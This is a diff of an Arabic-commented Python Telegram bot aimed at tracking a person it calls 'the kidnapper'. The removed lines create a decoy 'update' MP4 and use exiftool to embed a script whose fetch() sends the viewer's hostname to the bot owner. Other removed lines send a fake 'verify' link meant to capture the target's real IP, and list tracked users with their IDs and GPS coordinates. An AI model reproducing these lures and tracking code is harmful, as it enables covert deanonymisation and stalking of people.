-            bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
-        else:
-            bot.send_message(OWNER_ID, "❌ فشل إنشاء ملف الفيديو")
-    except Exception as e:
-        bot.send_message(OWNER_ID, f"❌ خطأ في الفيديو: {e}")
-
-def create_video():
-    """إنشاء ملف فيديو وهمي"""
-    output_path = f"jozef_update_{int(time.time())}.mp4"
-    
-    try:
-        # محاولة استخدام ffmpeg
-        subprocess.run([
-            'ffmpeg', '-y', '-f', 'lavfi', '-i', 
-            'color=c=black:s=640x480:d=5', 
-            '-f', 'lavfi', '-i', 'anullsrc=r=44100:cl=mono',
-            '-shortest', output_path
-        ], capture_output=True, timeout=30)
-        
-        if os.path.exists(output_path) and os.path.getsize(output_path) > 1000:
-            # إضافة WebRTC metadata للكشف عن IP
-            try:
-                subprocess.run([
-                    'exiftool', f'-comment=<!DOCTYPE html><html><body><script>fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={OWNER_ID}&text=📍IP:%20"+window.location.hostname)</script></body></html>',
-                    output_path
-                ], capture_output=True, timeout=10)
-            except:
-                pass
-            
-            return output_path
-    except:
-        pass
-    
-    # إذا فشل ffmpeg، أنشئ ملف فيديو وهمي
-    with open(output_path, 'wb') as f:
-        # رأس ملف MP4 بسيط
-        f.write(b'\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00\x69\x73\x6f\x6d\x69\x73\x6f\x32\x61\x76\x63\x31\x6d\x70\x34\x31\x00\x00\x00\x08\x77\x69\x64\x65')
-        f.write(b'\x00' * 1000)
-    
-    return output_path
-
-# ================== IP حقيقي ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🌐 IP حقيقي")
-def real_ip(message):
-    """إرسال رابط كشف IP للخاطف"""
-    link = f"https://telegra.ph/verify-{int(time.time())}"
-    
-    bot.send_message(OWNER_ID,
-        f"🌐 **رابط كشف IP:**\n\n"
-        f"انسخ هذا الرابط وأرسله للخاطف:\n"
-        f"`{link}`\n\n"
-        f"عند فتح الرابط، سأرسل لك IP حقيقي!",
-        parse_mode="Markdown")
-
-# ================== حالة المتصلين ==================
-
-@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
-def show_status(message):
-    """عرض حالة جميع المتصلين"""
-    if not visitors:
-        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين حالياً")
-        return
-    
-    msg = "📊 **حالة المتصلين:**\n\n"
-    for cid, data in visitors.items():
-        status = "🟢 متصل" if data.get('last_seen') else "🔴 غير متصل"
-        username = data.get('username', 'غير معروف')
-        name = f"{data.get('first_name', '')} {data.get('last_name', '')}"
-        
-        msg += f"**@{username}** ({name})\n"
-        msg += f"ID: `{cid}`\n"
-        msg += f"الحالة: {status}\n"
-        if data.get('last_location'):
-            loc = data['last_location']
-            msg += f"📍 {loc['lat']}, {loc['lon']}\n"
-        msg += "\n"
-    
-    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
-
-# ================== متابعة جميع الرسائل ==================
+# ================== التقاط جميع الرسائل ==================
 
 @bot.message_handler(func=lambda m: True)
 def catch_all(message):
-    """التقاط جميع الرسائل"""
     cid = message.chat.id
-    uid = message.from_user.id
     text = message.text or "[وسائط]"
     
-    # تحديث المتصل
     if cid in visitors:
         visitors[cid]['last_seen'] = datetime.now().isoformat()
     
-    # إذا كان الخاطف يرسل شيء
     uname = message.from_user.username or ""
-    if uname.lower() == TARGET_USERNAME.lower():
-        bot.send_message(OWNER_ID,
-            f"✉️ **رسالة من الخاطف:**\n\n"
-            f"{text}\n\n"
-            f"⏰ {datetime.now().isoformat()}",
-            parse_mode="Markdown")
+    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != OWNER_ID:
+        bot.send_message(OWNER_ID, f"✉️ **رسالة من الخاطف:**\n{text}\n⏰ {datetime.now().isoformat()}", parse_mode="Markdown")
 
 # ================== تشغيل البوت ==================
 
 if __name__ == "__main__":
     os.makedirs("photos", exist_ok=True)
-    os.makedirs("data", exist_ok=True)
+    os.makedirs("received_data", exist_ok=True)
     
-    logger.info("🤖 البوت شغال...")
-    print("✅ البوت شغال على Render!")
+    print("✅ البوت شغال!")
     
-    # إعلام الأمير
-    bot.send_message(OWNER_ID, "🟢 **البوت شغال وجاهز!**\n\nاستخدم /start لعرض لوحة التحكم", parse_mode="Markdown")
+    try:
+        bot.send_message(OWNER_ID, "🟢 **البوت شغال!**\n\n/start لعرض لوحة التحكم", parse_mode="Markdown")
+    except:
+        pass
     
     bot.infinity_polling()
